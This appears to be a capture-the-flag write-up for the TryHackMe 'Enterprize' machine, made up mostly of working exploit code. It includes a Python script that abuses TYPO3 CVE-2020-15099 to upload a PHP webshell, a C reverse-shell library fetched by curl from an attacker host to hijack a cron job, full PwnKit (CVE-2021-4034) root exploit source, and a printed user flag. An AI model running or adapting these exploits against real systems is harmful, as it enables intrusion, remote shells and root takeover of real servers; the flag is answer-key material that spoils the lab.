# Enterprize THM — Full Exploitation Writeup

## 1. Initial Access — CVE-2020-15099 (TYPO3 Deserialization RCE)

### Recon

| Item | Value |
|------|-------|
| Target | `http://maintest.enterprize.thm` |
| Encryption Key | Fetched from `/typo3conf/LocalConfiguration.old` |
| Form Page | `/index.php?id=38` |
| Form Name | `contactForm-144` |
| Shell Path | `/fileadmin/_temp_/shell.php` |

### Python Exploit (Webshell Upload)

```python
#!/usr/bin/env python3
"""
CVE-2020-15099 — TYPO3 Deserialization RCE
Uploads a PHP webshell via the Form Framework __state field.
"""

import requests
import subprocess
import re
import sys
import hmac
import hashlib
import os
import time
import json

TARGET = "http://maintest.enterprize.thm"
CONFIG_URL = f"{TARGET}/typo3conf/LocalConfiguration.old"
FORM_PAGE_URL = f"{TARGET}/index.php?id=38"
PHPGGC = "phpggc/phpggc"
REMOTE_SHELL_PATH = "/var/www/html/public/fileadmin/_temp_/shell.php"
SHELL_URL = f"{TARGET}/fileadmin/_temp_/shell.php"
FORM_NAME = "contactForm-144"
SHELL_CONTENT = "<?php system($_GET['c']); ?>"


def get_encryption_key():
    r = requests.get(CONFIG_URL)
    match = re.search(r"['\"]encryptionKey['\"]\s*=>\s*['\"]([^'\"]+)['\"]", r.text)
    if not match:
        sys.exit(1)
    return match.group(1)


def create_local_shell():
    shell_path = os.path.join(os.getcwd(), "typo3_shell.php")
    with open(shell_path, "w") as f:
        f.write(SHELL_CONTENT)
    return shell_path


def generate_payload(local_shell_path):
    shell_name = os.path.basename(local_shell_path)
    docker_cmd = [
        "docker", "run", "--rm",
        "-v", f"{os.getcwd()}:/app", "-w", "/app",
        "php:7.2-cli", "php", PHPGGC,
        "--base64", "--fast-destruct",
        "Guzzle/FW1", REMOTE_SHELL_PATH,
        f"/app/{shell_name}"
    ]
    result = subprocess.run(docker_cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Docker failed: {result.stderr[:300]}")
        sys.exit(1)
    return result.stdout.strip()


def compute_hmac(data, key):
    return hmac.new(key.encode(), data.encode(), hashlib.sha1).hexdigest()


def clean_output(raw):
    try:
        data = json.loads(raw)
        if isinstance(data, list) and len(data) > 0:
            return data[0].get("Value", raw)
    except (json.JSONDecodeError, KeyError, IndexError):
        pass
    return raw


def run_command(session, command):
    r = session.get(SHELL_URL, params={"c": command}, timeout=30)
    return clean_output(r.text)


def upload_webshell(encryption_key, local_shell_path):
    payload = generate_payload(local_shell_path)
    hmac_sig = compute_hmac(payload, encryption_key)
    final_payload = payload + hmac_sig

    session = requests.Session()
    r_page = session.get(FORM_PAGE_URL)
    html = r_page.text

    # Extract cHash
    m = re.search(r'cHash=([a-f0-9]+)', html)
    if not m:
        sys.exit(1)
    cHash = m.group(1)

    # Extract __trustedProperties (PHP-serialized + HMAC)
    m = re.search(
        r'name="tx_form_formframework\[__trustedProperties\]"\s+value="([^"]*)"', html
    )
    if not m:
        sys.exit(1)
    trusted_props = m.group(1).replace('&quot;', '"').replace('&amp;', '&')

    # Extract honeypot field name
    known_fields = {'name', 'subject', 'email', 'message', '__currentPage'}
    field_names = re.findall(r's:\d+:"([^"]+)";i:1;', trusted_props)
    honeypot_name = None
    for f in field_names:
        if f not in known_fields:
            honeypot_name = f
            break

    # Build POST URL (exact match to form action)
    post_url = (
        f"{TARGET}/index.php?id=38"
        f"&tx_form_formframework%5Baction%5D=perform"
        f"&tx_form_formframework%5Bcontroller%5D=FormFrontend"
        f"&cHash={cHash}"
    )

    # Multipart fields
    files = {
        f"tx_form_formframework[{FORM_NAME}][__state]": (None, final_payload),
        "tx_form_formframework[__trustedProperties]": (None, trusted_props),
        f"tx_form_formframework[{FORM_NAME}][name]": (None, "test"),
        f"tx_form_formframework[{FORM_NAME}][subject]": (None, "test"),
        f"tx_form_formframework[{FORM_NAME}][email]": (None, "test@test.com"),
        f"tx_form_formframework[{FORM_NAME}][message]": (None, "test"),
        f"tx_form_formframework[{FORM_NAME}][__currentPage]": (None, "1"),
    }
    if honeypot_name:
        files[f"tx_form_formframework[{FORM_NAME}][{honeypot_name}]"] = (None, "")

    r = session.post(post_url, files=files)
    if r.status_code != 500:
        print(f"[-] Expected HTTP 500, got {r.status_code}")
        sys.exit(1)
    print("[+] Webshell uploaded!")

    time.sleep(2)
    r2 = session.get(SHELL_URL, params={"c": "id"}, timeout=5)
    if r2.status_code != 200:
        sys.exit(1)
    print(f"[+] Shell live: {clean_output(r2.text)}")
    return session


def repl(session):
    print("[*] Interactive shell ready. Type 'exit' or Ctrl+C to quit.\n")
    while True:
        try:
            cmd = input(f"www-data$ ")
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Bye.")
            break
        if not cmd.strip():
            continue
        if cmd.strip() in ("exit", "quit"):
            break
        output = run_command(session, cmd)
        if output:
            print(output)
        else:
            print("[*] (no output)")


if __name__ == "__main__":
    key = get_encryption_key()
    print(f"[+] encryptionKey: {key}")
    shell = create_local_shell()
    session = upload_webshell(key, shell)
    repl(session)
```

### Usage

```bash
# Prerequisites:
# - Docker with php:7.2-cli image
# - phpggc cloned locally (phpggc/phpggc)
# - Delete non-Guzzle chains to avoid PHP 7.2 parse errors:
find phpggc/gadgetchains -mindepth 1 -maxdepth 1 -type d ! -name Guzzle -exec rm -rf {} +

python3 exploit_webshell.py
```

---

## 2. Privilege Escalation: www-data → john (libcustom.so Hijack)

### How It Works

1. Cron runs two commands:
   - `/sbin/ldconfig` (as root)
   - `/home/john/develop/myapp > /home/john/develop/result.txt` (as john)
2. `/etc/ld.so.conf.d/x86_64-libc.conf` is a **symlink** to `/home/john/develop/test.conf`
3. `/home/john/develop/` is **world-writable** (`drwxrwxrwt`)
4. We place our `libcustom.so` in `/home/john/develop/`, write the path to `test.conf`, and run `ldconfig`
5. Next cron cycle: `ldconfig` picks up our path → `myapp` loads **our** `libcustom.so` → reverse shell as john

### Python Exploit (One-Shot)

```python
#!/usr/bin/env python3
"""
PrivEsc: www-data → john via libcustom.so hijack
Requires: webshell already uploaded (from step 1)
"""

import requests
import subprocess
import re
import sys
import os
import time
import json

TARGET = "http://maintest.enterprize.thm"
SHELL_URL = f"{TARGET}/fileadmin/_temp_/shell.php"
DEVELOP_DIR = "/home/john/develop"
LIB_ON_TARGET = f"{DEVELOP_DIR}/libcustom.so"
TEST_CONF = f"{DEVELOP_DIR}/test.conf"


def clean_output(raw):
    try:
        data = json.loads(raw)
        if isinstance(data, list) and len(data) > 0:
            return data[0].get("Value", raw)
    except (json.JSONDecodeError, KeyError, IndexError):
        pass
    return raw


def run_command(session, command):
    r = session.get(SHELL_URL, params={"c": command}, timeout=30)
    return clean_output(r.text)


def compile_malicious_lib(attacker_ip, attacker_port):
    print("[*] Compiling malicious libcustom.so...")
    src = f"""#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void do_ping() {{
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {{0}};
    a.sin_family = AF_INET;
    a.sin_port = htons({attacker_port});
    inet_pton(AF_INET, "{attacker_ip}", &a.sin_addr);
    connect(s, (struct sockaddr*)&a, sizeof(a));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    setenv("TERM", "xterm", 1);
    setenv("PS1", "john\\$ ", 1);
    execl("/bin/bash", "bash", "--norc", "--noprofile", "-i", NULL);
    _exit(1);
}}
"""
    src_path = os.path.join(os.getcwd(), "libcustom.c")
    lib_path = os.path.join(os.getcwd(), "libcustom.so")

    with open(src_path, "w") as f:
        f.write(src)

    result = subprocess.run(
        ["gcc", "-shared", "-o", lib_path, "-fPIC", "-m64", src_path],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"[-] gcc failed: {result.stderr}")
        sys.exit(1)
    print(f"[+] Compiled: {lib_path} ({os.path.getsize(lib_path)} bytes)")
    return lib_path


def start_http_server(directory, port):
    print(f"[*] Starting HTTP server on 0.0.0.0:{port}")
    server_proc = subprocess.Popen(
        [sys.executable, "-m", "http.server", str(port), "--bind", "0.0.0.0"],
        cwd=directory,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)
    return server_proc


def deploy(session, attacker_ip, http_port):
    lib_path = compile_malicious_lib(attacker_ip, http_port)  # reuse port var for clarity
    # Actually use separate ports:
    pass


def main():
    print("=" * 60)
    print("  PrivEsc: www-data -> john (libcustom.so hijack)")
    print("=" * 60)

    attacker_ip = input("\n[>] Your attacker IP: ").strip()
    listener_port = int(input("[>] Listener port (for reverse shell): ").strip())
    http_port = int(input("[>] HTTP server port (for file transfer): ").strip())

    # Get session to existing webshell
    session = requests.Session()
    r = session.get(SHELL_URL, params={"c": "id"}, timeout=5)
    if r.status_code != 200:
        print("[-] Webshell not accessible. Run step 1 first.")
        sys.exit(1)
    print(f"[+] Webshell confirmed: {clean_output(r.text)}")

    # Compile
    lib_path = compile_malicious_lib(attacker_ip, listener_port)

    # Serve and upload
    server_proc = start_http_server(os.getcwd(), http_port)

    cmd = f"curl -o {LIB_ON_TARGET} http://{attacker_ip}:{http_port}/libcustom.so"
    print(f"[*] Running on target: {cmd}")
    run_command(session, cmd)

    out = run_command(session, f"ls -la {LIB_ON_TARGET}")
    print(f"[*] {out}")

    # Verify non-zero
    if "0 " in out.split() and "0" == [x for x in out.split() if x.isdigit()][-1]:
        print("[-] File is 0 bytes! Upload failed.")
        server_proc.terminate()
        sys.exit(1)

    # Write test.conf (symlink target in /etc/ld.so.conf.d/)
    run_command(session, f"echo '{DEVELOP_DIR}' > {TEST_CONF}")
    out = run_command(session, f"cat {TEST_CONF}")
    print(f"[*] test.conf: {out}")

    # Run ldconfig NOW
    run_command(session, "/sbin/ldconfig")
    print("[*] ldconfig executed")

    server_proc.terminate()

    print(f"\n[+] Done! Start your listener:")
    print(f"    nc -lvnp {listener_port}")
    print(f"[*] Cron fires every ~2 minutes.")


if __name__ == "__main__":
    main()
```

### Usage

```bash
# Terminal 1:
nc -lvnp 6047

# Terminal 2:
python3 exploit_privesc_john.py
```

Wait ~2 minutes. You get a shell as **john**.

### User Flag

```bash
cat /home/john/user.txt
# THM{a99acf52687be464db48eca3b3359572}
```

---

## 3. Privilege Escalation: john → root (PwnKit CVE-2021-4034)

### How It Works

`/usr/bin/pkexec` is SUID root. PwnKit exploits an off-by-one in its env var parsing:

1. Set `PATH` to a directory literally named `GCONV_PATH=.`
2. Set `SHELL=pwnkit` (triggers GLib charset conversion error path)
3. pkexec's bug writes `GCONV_PATH=./pwnkit` back into the environment
4. GLib reads `./pwnkit/gconv-modules` → loads our `pwnkit.so` **as root**
5. `gconv_init()` in our .so sets uid=0 and spawns a shell

### Files to Compile Locally

**`pwnkit.c`:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <grp.h>

void gconv() {}
void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0, NULL);
    seteuid(0);
    setegid(0);
    putenv("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    execve("/bin/sh", (char*[]){"sh", NULL}, NULL);
}
```

**`exploit.c`:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    system("rm -rf 'GCONV_PATH=.' pwnkit");
    system("mkdir -p 'GCONV_PATH=.'");
    system("touch 'GCONV_PATH=./pwnkit' && chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit");
    system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
    system("cp pwnkit.so pwnkit/");

    char *envp[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "SHELL=pwnkit",
        "CHARSET=PWNKIT",
        NULL
    };
    char *argv[] = { NULL };
    execve("/usr/bin/pkexec", argv, envp);
    return 0;
}
```

### Compile

```bash
gcc -shared -fPIC -o pwnkit.so pwnkit.c
gcc -static -o exploit exploit.c
python3 -m http.server 8008
```

### Deploy on Target (from john shell)

```bash
cd /tmp
curl -o exploit http://ATTACKER_IP:8008/exploit
curl -o pwnkit.so http://ATTACKER_IP:8008/pwnkit.so
chmod +x exploit
./exploit
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Summary

| Stage | CVE / Method | Result |
|-------|-------------|--------|
| Initial Access | CVE-2020-15099 (TYPO3 deserialization) | `www-data` webshell |
| PrivEsc 1 | `libcustom.so` hijack via `ld.so.conf.d` symlink | `john` |
| PrivEsc 2 | CVE-2021-4034 (PwnKit / pkexec) | `root` |

